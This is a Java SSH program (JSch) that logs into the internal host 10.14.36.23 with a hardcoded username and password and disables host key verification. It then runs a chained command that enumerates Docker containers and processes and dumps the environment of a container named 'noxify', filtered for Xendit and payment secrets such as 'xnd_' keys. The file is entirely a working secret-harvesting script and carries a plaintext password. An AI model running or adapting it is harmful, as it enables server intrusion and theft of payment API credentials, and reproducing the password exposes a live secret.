import com.jcraft.jsch.*;
import java.io.*;
class SSH3 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    s.setConfig(p);
    s.setTimeout(15000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    ch.setCommand("id;hostname;echo ---DOCKER-CONTAINERS---;sudo docker ps --format '{{.Names}}|{{.Image}}|{{.Ports}}' 2>/dev/null || docker ps --format '{{.Names}}|{{.Image}}|{{.Ports}}' 2>/dev/null;echo ---NOXIFY-SEARCH---;sudo docker ps 2>/dev/null | grep -iE 'noxify|neo|payment|xendit';echo ---ALL-CONTAINERS---;sudo docker ps -a --format '{{.Names}}' 2>/dev/null | head -30;echo ---GREP-XENDIT---;sudo docker exec $(sudo docker ps -q --filter name=noxify 2>/dev/null | head -1) env 2>/dev/null | grep -iE 'xendit|xnd_|payment';echo ---PROC-SEARCH---;ps aux | grep -iE 'noxify|xendit|payment|neo' | grep -v grep | head -10");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    InputStream err = ch.getErrStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    while ((i = err.read(buf)) != -1) System.err.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
